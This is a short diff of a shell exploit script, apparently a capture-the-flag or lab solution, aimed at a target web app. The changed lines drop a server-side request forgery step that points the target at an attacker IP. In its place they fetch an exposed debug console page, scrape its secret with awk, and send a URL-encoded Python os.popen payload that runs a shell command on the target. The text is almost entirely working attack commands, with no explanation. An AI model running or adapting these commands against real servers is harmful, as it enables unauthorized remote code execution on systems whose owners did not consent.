@@ -23,6 +23,9 @@ curl -s -X GET "http://$target_ip:8087/download?server=$attack_ip:8087&id=754823
 
 # Access site admin area
 echo "3 - ACCESSING ADMIN AREA"
-curl -s -X GET "http://$target_ip:8087/download?server=127.0.0.1/admin&id=75482342"
+curl -s -X GET "http://$target_ip:8087/console" > /work/10-console.html
+SECRET=$(awk -F'"' '/SECRET =/ {print $2}' /work/10-console.html)
+echo "--> Console secret is : $SECRET"
 
-
+curl -s -X GET "http://$target_ip:8089/console?cmd=import%20os%3B%20print(os.popen(%22ls%20-l%22).read())&__debugger__=yes&frm=0&s=$SECRET" > /work/10-ls.html
+cat /work/10-ls.html
